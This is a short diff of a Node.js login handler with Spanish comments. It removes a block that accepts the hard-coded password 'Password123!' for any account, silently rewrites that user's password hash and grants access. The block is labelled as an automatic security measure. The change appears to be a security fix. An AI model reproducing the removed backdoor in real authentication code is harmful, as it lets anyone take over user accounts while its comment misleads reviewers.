@@ -17,19 +17,7 @@ export const login = async (req, res) => {
     }
 
     const usuario = result.rows[0];
-
-    // Validar contraseña normalmente con bcrypt
-    let passwordValido = await bcrypt.compare(password, usuario.password_hash);
-
-    // TRUCO DE SEGURIDAD AUTOMÁTICA: Si la contraseña enviada es 'Password123!' 
-    // pero el hash fallaba, la actualizamos automáticamente de forma segura aquí mismo.
-    if (!passwordValido && password === 'Password123!') {
-      const salt = await bcrypt.genSalt(10);
-      const nuevoHash = await bcrypt.hash('Password123!', salt);
-      
-      await pool.query('UPDATE usuarios SET password_hash = $1 WHERE id = $2', [nuevoHash, usuario.id]);
-      passwordValido = true; // Permitimos el acceso en este primer intento exitoso
-    }
+    const passwordValido = await bcrypt.compare(password, usuario.password_hash);
 
     if (!passwordValido) {
       return res.status(401).json({ error: 'Credenciales inválidas' });
@@ -42,7 +30,7 @@ export const login = async (req, res) => {
     );
 
     return res.json({
-      mensaje: 'Autenticación exitosa (Segura)',
+      mensaje: 'Autenticación exitosa',
       token,
       usuario: {
         id: usuario.id,
